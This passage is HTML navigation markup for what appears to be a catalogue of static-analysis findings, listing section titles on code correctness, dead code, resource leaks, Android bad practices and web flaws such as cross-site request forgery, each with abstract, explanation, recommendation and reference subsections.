href="#EXPLANATION-62"><span class="toc-number">1.2.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-63"><span class="toc-number">1.2.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-60"><span class="toc-number">1.2.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-String-Comparison-of-Float"><span class="toc-number">1.2.13.</span> <span class="toc-text">Code Correctness: String Comparison of Float</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-62"><span class="toc-number">1.2.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-63"><span class="toc-number">1.2.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-64"><span class="toc-number">1.2.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-61"><span class="toc-number">1.2.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-clone-Invokes-Overridable-Function"><span class="toc-number">1.2.14.</span> <span class="toc-text">Code Correctness: clone() Invokes Overridable Function</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-63"><span class="toc-number">1.2.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-64"><span class="toc-number">1.2.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-65"><span class="toc-number">1.2.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-62"><span class="toc-number">1.2.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-null-Argument-to-equals"><span class="toc-number">1.2.15.</span> <span class="toc-text">Code Correctness: null Argument to equals()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-64"><span class="toc-number">1.2.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-65"><span class="toc-number">1.2.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-66"><span class="toc-number">1.2.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-63"><span class="toc-number">1.2.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-readObject-Invokes-Overridable-Function"><span class="toc-number">1.2.16.</span> <span class="toc-text">Code Correctness: readObject() Invokes Overridable Function</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-65"><span class="toc-number">1.2.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-66"><span class="toc-number">1.2.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-67"><span class="toc-number">1.2.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-64"><span class="toc-number">1.2.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dead-Code-Empty-Try-Block"><span class="toc-number">1.2.17.</span> <span class="toc-text">Dead Code: Empty Try Block</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-66"><span class="toc-number">1.2.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-67"><span class="toc-number">1.2.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-68"><span class="toc-number">1.2.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-65"><span class="toc-number">1.2.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dead-Code-Expression-is-Always-false"><span class="toc-number">1.2.18.</span> <span class="toc-text">Dead Code: Expression is Always false</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-67"><span class="toc-number">1.2.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-68"><span class="toc-number">1.2.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-69"><span class="toc-number">1.2.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-66"><span class="toc-number">1.2.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dead-Code-Expression-is-Always-true"><span class="toc-number">1.2.19.</span> <span class="toc-text">Dead Code: Expression is Always true</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-68"><span class="toc-number">1.2.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-69"><span class="toc-number">1.2.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-70"><span class="toc-number">1.2.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-67"><span class="toc-number">1.2.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dead-Code-Unused-Field"><span class="toc-number">1.2.20.</span> <span class="toc-text">Dead Code: Unused Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-69"><span class="toc-number">1.2.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-70"><span class="toc-number">1.2.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-71"><span class="toc-number">1.2.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-68"><span class="toc-number">1.2.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dead-Code-Unused-Method"><span class="toc-number">1.2.21.</span> <span class="toc-text">Dead Code: Unused Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-70"><span class="toc-number">1.2.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-71"><span class="toc-number">1.2.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-72"><span class="toc-number">1.2.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-69"><span class="toc-number">1.2.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Null-Dereference"><span class="toc-number">1.2.22.</span> <span class="toc-text">Null Dereference</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-71"><span class="toc-number">1.2.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-72"><span class="toc-number">1.2.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-73"><span class="toc-number">1.2.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-70"><span class="toc-number">1.2.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Obsolete"><span class="toc-number">1.2.23.</span> <span class="toc-text">Obsolete</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-72"><span class="toc-number">1.2.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-73"><span class="toc-number">1.2.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-74"><span class="toc-number">1.2.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-71"><span class="toc-number">1.2.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Confusing-Naming-class-and-member"><span class="toc-number">1.2.24.</span> <span class="toc-text">Poor Style: Confusing Naming(class_and_member)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-73"><span class="toc-number">1.2.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-74"><span class="toc-number">1.2.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-75"><span class="toc-number">1.2.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-72"><span class="toc-number">1.2.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Confusing-Naming-member-and-method"><span class="toc-number">1.2.25.</span> <span class="toc-text">Poor Style: Confusing Naming(member_and_method)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-74"><span class="toc-number">1.2.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-75"><span class="toc-number">1.2.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-76"><span class="toc-number">1.2.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-73"><span class="toc-number">1.2.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Empty-Synchronized-Block"><span class="toc-number">1.2.26.</span> <span class="toc-text">Poor Style: Empty Synchronized Block</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-75"><span class="toc-number">1.2.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-76"><span class="toc-number">1.2.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-77"><span class="toc-number">1.2.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-74"><span class="toc-number">1.2.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Identifier-Contains-Dollar-Symbol"><span class="toc-number">1.2.27.</span> <span class="toc-text">Poor Style: Identifier Contains Dollar Symbol ($)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-76"><span class="toc-number">1.2.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-77"><span class="toc-number">1.2.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-78"><span class="toc-number">1.2.27.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-75"><span class="toc-number">1.2.27.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Redundant-Initialization"><span class="toc-number">1.2.28.</span> <span class="toc-text">Poor Style: Redundant Initialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-77"><span class="toc-number">1.2.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-78"><span class="toc-number">1.2.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-79"><span class="toc-number">1.2.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-76"><span class="toc-number">1.2.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Value-Never-Read"><span class="toc-number">1.2.29.</span> <span class="toc-text">Poor Style: Value Never Read</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-78"><span class="toc-number">1.2.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-79"><span class="toc-number">1.2.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-80"><span class="toc-number">1.2.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-77"><span class="toc-number">1.2.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Portability-Flaw-File-Separator"><span class="toc-number">1.2.30.</span> <span class="toc-text">Portability Flaw: File Separator</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-79"><span class="toc-number">1.2.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-80"><span class="toc-number">1.2.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-81"><span class="toc-number">1.2.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-78"><span class="toc-number">1.2.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Portability-Flaw-Locale-Dependent-Comparison"><span class="toc-number">1.2.31.</span> <span class="toc-text">Portability Flaw: Locale Dependent Comparison</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-80"><span class="toc-number">1.2.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-81"><span class="toc-number">1.2.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-82"><span class="toc-number">1.2.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-79"><span class="toc-number">1.2.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Portability-Flaw-Native-SQL"><span class="toc-number">1.2.32.</span> <span class="toc-text">Portability Flaw: Native SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-81"><span class="toc-number">1.2.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-82"><span class="toc-number">1.2.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-83"><span class="toc-number">1.2.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-80"><span class="toc-number">1.2.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Race-Condition-Class-Initialization-Cycle"><span class="toc-number">1.2.33.</span> <span class="toc-text">Race Condition: Class Initialization Cycle</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-82"><span class="toc-number">1.2.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-83"><span class="toc-number">1.2.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-84"><span class="toc-number">1.2.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-81"><span class="toc-number">1.2.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Redundant-Null-Check"><span class="toc-number">1.2.34.</span> <span class="toc-text">Redundant Null Check</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-83"><span class="toc-number">1.2.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-84"><span class="toc-number">1.2.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-85"><span class="toc-number">1.2.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-82"><span class="toc-number">1.2.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Android-Camera"><span class="toc-number">1.2.35.</span> <span class="toc-text">Unreleased Resource: Android Camera</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-84"><span class="toc-number">1.2.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-85"><span class="toc-number">1.2.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-86"><span class="toc-number">1.2.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-83"><span class="toc-number">1.2.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Android-Media"><span class="toc-number">1.2.36.</span> <span class="toc-text">Unreleased Resource: Android Media</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-85"><span class="toc-number">1.2.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-86"><span class="toc-number">1.2.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-87"><span class="toc-number">1.2.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-84"><span class="toc-number">1.2.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Android-SQLite-Database"><span class="toc-number">1.2.37.</span> <span class="toc-text">Unreleased Resource: Android SQLite Database</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-86"><span class="toc-number">1.2.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-87"><span class="toc-number">1.2.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-88"><span class="toc-number">1.2.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-85"><span class="toc-number">1.2.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Database"><span class="toc-number">1.2.38.</span> <span class="toc-text">Unreleased Resource: Database</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-87"><span class="toc-number">1.2.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-88"><span class="toc-number">1.2.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-89"><span class="toc-number">1.2.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-86"><span class="toc-number">1.2.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Files"><span class="toc-number">1.2.39.</span> <span class="toc-text">Unreleased Resource: Files</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-88"><span class="toc-number">1.2.39.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-89"><span class="toc-number">1.2.39.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-90"><span class="toc-number">1.2.39.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-87"><span class="toc-number">1.2.39.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Sockets"><span class="toc-number">1.2.40.</span> <span class="toc-text">Unreleased Resource: Sockets</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-89"><span class="toc-number">1.2.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-90"><span class="toc-number">1.2.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-91"><span class="toc-number">1.2.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-88"><span class="toc-number">1.2.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Streams"><span class="toc-number">1.2.41.</span> <span class="toc-text">Unreleased Resource: Streams</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-90"><span class="toc-number">1.2.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-91"><span class="toc-number">1.2.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-92"><span class="toc-number">1.2.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-89"><span class="toc-number">1.2.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Synchronization"><span class="toc-number">1.2.42.</span> <span class="toc-text">Unreleased Resource: Synchronization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-91"><span class="toc-number">1.2.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-92"><span class="toc-number">1.2.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-93"><span class="toc-number">1.2.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-90"><span class="toc-number">1.2.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#封装"><span class="toc-number">1.3.</span> <span class="toc-text">封装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ADF-Bad-Practices-Default-url-invoke-disallowed-Setting"><span class="toc-number">1.3.1.</span> <span class="toc-text">ADF Bad Practices: Default url-invoke-disallowed Setting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-92"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-93"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-94"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-91"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Encryption-Secret-Held-in-Static-Field"><span class="toc-number">1.3.2.</span> <span class="toc-text">Android Bad Practices: Encryption Secret Held in Static Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-93"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-94"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-95"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-92"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Leftover-Debug-Code"><span class="toc-number">1.3.3.</span> <span class="toc-text">Android Bad Practices: Leftover Debug Code</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-94"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-95"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-96"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-93"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Request-Forgery"><span class="toc-number">1.3.4.</span> <span class="toc-text">Cross-Site Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-95"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-96"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-97"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-94"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-WebSocket-Hijacking"><span class="toc-number">1.3.5.</span> <span class="toc-text">Cross-Site WebSocket Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-96"><span 